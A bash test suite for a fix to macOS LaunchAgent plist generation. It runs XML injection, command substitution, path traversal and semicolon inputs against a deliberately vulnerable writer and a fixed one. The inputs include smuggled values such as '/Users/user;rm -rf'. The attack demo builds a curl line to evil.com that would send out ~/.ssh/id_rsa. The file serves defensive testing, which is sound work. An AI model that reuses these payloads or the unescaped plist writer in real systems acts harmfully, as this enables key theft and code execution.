#!/bin/bash
# ═══════════════════════════════════════════════════════════════════
# PHASE 1.5 TEST SUITE: LaunchAgent Plist XML Injection
# ═══════════════════════════════════════════════════════════════════
#
# Tests both VULNERABLE and FIXED implementations to demonstrate:
# 1. Attack vectors (XML injection, command substitution, path manipulation)
# 2. Defense effectiveness (validation + escaping)
# 3. Legitimate use cases still work
#
# Usage:
#   bash phase1-5-test-suite.sh
# ═══════════════════════════════════════════════════════════════════

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# ─── Source the fixed implementation ───
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/phase1-5-plist-injection.sh"

# ─── Test Framework ───

test_start() {
    local name="$1"
    ((TOTAL_TESTS++))
    echo ""
    echo -e "${CYAN}TEST $TOTAL_TESTS:${NC} $name"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

test_pass() {
    local msg="${1:-passed}"
    ((PASSED_TESTS++))
    echo -e "  ${GREEN}✓${NC} $msg"
}

test_fail() {
    local msg="${1:-failed}"
    ((FAILED_TESTS++))
    echo -e "  ${RED}✗${NC} $msg"
}

test_info() {
    echo -e "  ${YELLOW}→${NC} $1"
}

# ─── VULNERABLE Implementation (for comparison) ───

create_launch_agent_vulnerable() {
    local home_path="$1"
    local output_file="$2"
    
    # THIS IS THE ORIGINAL VULNERABLE CODE
    # No validation, no escaping!
    cat > "$output_file" << VULN_PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>ai.openclaw.gateway</string>
    <key>ProgramArguments</key>
    <array>
        <string>${home_path}/.openclaw/bin/openclaw</string>
        <string>gateway</string>
        <string>start</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/tmp/openclaw/gateway.log</string>
    <key>WorkingDirectory</key>
    <string>${home_path}/.openclaw</string>
</dict>
</plist>
VULN_PLIST
    
    return 0  # Always succeeds (dangerous!)
}

# ─── Test Cases ───

test_valid_username() {
    test_start "Valid username (should work)"
    
    local test_home="/Users/validuser"
    local output="/tmp/test-valid.plist"
    
    test_info "Testing HOME=$test_home"
    
    if create_launch_agent_safe "$test_home" "$output"; then
        if plutil -lint "$output" >/dev/null 2>&1; then
            test_pass "Valid plist created and validated"
        else
            test_fail "plist created but failed plutil validation"
        fi
        rm -f "$output"
    else
        test_fail "Should have succeeded for valid username"
    fi
}

test_valid_username_with_hyphen() {
    test_start "Valid username with hyphen (should work)"
    
    local test_home="/Users/john-doe"
    local output="/tmp/test-hyphen.plist"
    
    test_info "Testing HOME=$test_home"
    
    if create_launch_agent_safe "$test_home" "$output"; then
        if plutil -lint "$output" >/dev/null 2>&1; then
            test_pass "Valid plist with hyphenated username"
        else
            test_fail "plist created but failed validation"
        fi
        rm -f "$output"
    else
        test_fail "Should work with hyphens in username"
    fi
}

test_valid_username_with_underscore() {
    test_start "Valid username with underscore (should work)"
    
    local test_home="/Users/jane_smith"
    local output="/tmp/test-underscore.plist"
    
    test_info "Testing HOME=$test_home"
    
    if create_launch_agent_safe "$test_home" "$output"; then
        if plutil -lint "$output" >/dev/null 2>&1; then
            test_pass "Valid plist with underscored username"
        else
            test_fail "plist created but failed validation"
        fi
        rm -f "$output"
    else
        test_fail "Should work with underscores in username"
    fi
}

test_xml_injection() {
    test_start "XML injection attack (should BLOCK)"
    
    local test_home='</string><string>/usr/bin/malicious</string><string>/tmp/fake'
    local output="/tmp/test-xml-inject.plist"
    
    test_info "Attack payload: $test_home"
    
    # Test VULNERABLE version (should succeed but create malicious plist)
    if create_launch_agent_vulnerable "$test_home" "$output" 2>/dev/null; then
        if grep -q "/usr/bin/malicious" "$output" 2>/dev/null; then
            test_info "VULNERABLE: Injected malicious path found!"
            cat "$output" | grep -A2 -B2 "malicious" | head -5
        fi
        rm -f "$output"
    fi
    
    # Test FIXED version (should reject)
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: XML injection not blocked!"
        rm -f "$output"
    else
        test_pass "XML injection correctly blocked"
    fi
}

test_command_substitution() {
    test_start "Command substitution attack (should BLOCK)"
    
    local test_home='/Users/$(whoami)'
    local output="/tmp/test-cmd-subst.plist"
    
    test_info "Attack payload: $test_home"
    
    # Test VULNERABLE version
    if create_launch_agent_vulnerable "$test_home" "$output" 2>/dev/null; then
        test_info "VULNERABLE: Command substitution passed through"
        grep "ProgramArguments" "$output" -A3 | head -5
        rm -f "$output"
    fi
    
    # Test FIXED version (should reject)
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: Command substitution not blocked!"
        rm -f "$output"
    else
        test_pass "Command substitution correctly blocked"
    fi
}

test_invalid_path_tmp() {
    test_start "Invalid path (/tmp) attack (should BLOCK)"
    
    local test_home='/tmp/fake'
    local output="/tmp/test-tmp-path.plist"
    
    test_info "Attack payload: $test_home"
    
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: /tmp path not blocked!"
        rm -f "$output"
    else
        test_pass "Non-/Users path correctly blocked"
    fi
}

test_path_traversal() {
    test_start "Path traversal attack (should BLOCK)"
    
    local test_home='/Users/../../../tmp/evil'
    local output="/tmp/test-traversal.plist"
    
    test_info "Attack payload: $test_home"
    
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: Path traversal not blocked!"
        rm -f "$output"
    else
        test_pass "Path traversal correctly blocked"
    fi
}

test_extra_path_components() {
    test_start "Extra path components (should BLOCK)"
    
    local test_home='/Users/validuser/malicious/path'
    local output="/tmp/test-extra-path.plist"
    
    test_info "Testing HOME=$test_home"
    
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: Extra path components not blocked!"
        rm -f "$output"
    else
        test_pass "Extra path components correctly blocked"
    fi
}

test_special_chars_semicolon() {
    test_start "Semicolon injection (should BLOCK)"
    
    local test_home='/Users/user;rm -rf'
    local output="/tmp/test-semicolon.plist"
    
    test_info "Attack payload: $test_home"
    
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: Semicolon not blocked!"
        rm -f "$output"
    else
        test_pass "Semicolon correctly blocked"
    fi
}

test_special_chars_ampersand() {
    test_start "Ampersand injection (should BLOCK)"
    
    local test_home='/Users/user&malicious'
    local output="/tmp/test-ampersand.plist"
    
    test_info "Attack payload: $test_home"
    
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: Ampersand not blocked!"
        rm -f "$output"
    else
        test_pass "Ampersand correctly blocked"
    fi
}

test_backticks() {
    test_start "Backtick command substitution (should BLOCK)"
    
    local test_home='/Users/`whoami`'
    local output="/tmp/test-backtick.plist"
    
    test_info "Attack payload: $test_home"
    
    if create_launch_agent_safe "$test_home" "$output" 2>/dev/null; then
        test_fail "SECURITY FAILURE: Backtick not blocked!"
        rm -f "$output"
    else
        test_pass "Backtick correctly blocked"
    fi
}

test_xml_entity_escaping() {
    test_start "XML entity escaping function"
    
    local input='<script>&alert("XSS")</script>'
    local expected='&lt;script&gt;&amp;alert(&quot;XSS&quot;)&lt;/script&gt;'
    
    test_info "Input: $input"
    
    local result
    result=$(escape_xml "$input")
    
    test_info "Output: $result"
    
    if [[ "$result" == "$expected" ]]; then
        test_pass "XML entities correctly escaped"
    else
        test_fail "Escaping incorrect"
        echo "  Expected: $expected"
        echo "  Got: $result"
    fi
}

test_plutil_method() {
    test_start "Alternative plutil method (should work)"
    
    local test_home="/Users/testuser"
    local output="/tmp/test-plutil.plist"
    
    test_info "Testing plutil-based generation"
    
    if create_launch_agent_plutil "$test_home" "$output"; then
        if plutil -lint "$output" >/dev/null 2>&1; then
            test_pass "plutil method creates valid plist"
            test_info "Generated plist sample:"
            head -10 "$output" | sed 's/^/    /'
        else
            test_fail "plutil method created invalid plist"
        fi
        rm -f "$output"
    else
        test_fail "plutil method failed"
    fi
}

# ─── Attack Demonstrations ───

demo_attack_scenario() {
    echo ""
    echo "════════════════════════════════════════════════════════"
    echo "ATTACK DEMONSTRATION: Real-world exploit scenario"
    echo "════════════════════════════════════════════════════════"
    echo ""
    
    local malicious_home='</string><string>/usr/bin/curl</string><string>http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)</string><string>/tmp'
    local output="/tmp/attack-demo.plist"
    
    echo "Attacker sets:"
    echo "  HOME='$malicious_home'"
    echo ""
    echo "Running VULNERABLE version..."
    echo ""
    
    if create_launch_agent_vulnerable "$malicious_home" "$output" 2>/dev/null; then
        echo "Generated plist (VULNERABLE):"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        cat "$output"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo -e "${RED}DANGER:${NC} LaunchAgent would execute:"
        echo "  1. /Users/</string>"
        echo "  2. curl http://evil.com/steal?data=\$(cat ~/.ssh/id_rsa)"
        echo "  3. /tmp"
        echo ""
        rm -f "$output"
    fi
    
    echo "Running FIXED version..."
    echo ""
    
    if create_launch_agent_safe "$malicious_home" "$output" 2>/dev/null; then
        echo -e "${RED}✗ FAILURE:${NC} Attack not blocked!"
        [ -f "$output" ] && rm -f "$output"
    else
        echo -e "${GREEN}✓ BLOCKED:${NC} Attack prevented by validation"
    fi
}

# ─── Summary Report ───

print_summary() {
    echo ""
    echo "════════════════════════════════════════════════════════"
    echo "TEST SUMMARY"
    echo "════════════════════════════════════════════════════════"
    echo ""
    echo "  Total Tests: $TOTAL_TESTS"
    echo -e "  ${GREEN}Passed: $PASSED_TESTS${NC}"
    echo -e "  ${RED}Failed: $FAILED_TESTS${NC}"
    echo ""
    
    if [ "$FAILED_TESTS" -eq 0 ]; then
        echo -e "${GREEN}${BOLD}✓ ALL TESTS PASSED${NC}"
        echo "  The fix successfully blocks all attack vectors."
        return 0
    else
        echo -e "${RED}${BOLD}✗ SOME TESTS FAILED${NC}"
        echo "  Review failures above."
        return 1
    fi
}

# ─── Main Test Runner ───

main() {
    echo ""
    echo "════════════════════════════════════════════════════════"
    echo "PHASE 1.5: LaunchAgent Plist XML Injection Test Suite"
    echo "════════════════════════════════════════════════════════"
    echo ""
    echo "This suite tests:"
    echo "  • Valid usernames (should work)"
    echo "  • XML injection attacks (should block)"
    echo "  • Command substitution (should block)"
    echo "  • Path manipulation (should block)"
    echo "  • Special character attacks (should block)"
    echo ""
    
    # Run all tests
    test_valid_username
    test_valid_username_with_hyphen
    test_valid_username_with_underscore
    test_xml_injection
    test_command_substitution
    test_invalid_path_tmp
    test_path_traversal
    test_extra_path_components
    test_special_chars_semicolon
    test_special_chars_ampersand
    test_backticks
    test_xml_entity_escaping
    test_plutil_method
    
    # Attack demonstration
    demo_attack_scenario
    
    # Summary
    print_summary
}

# Run tests
main "$@"
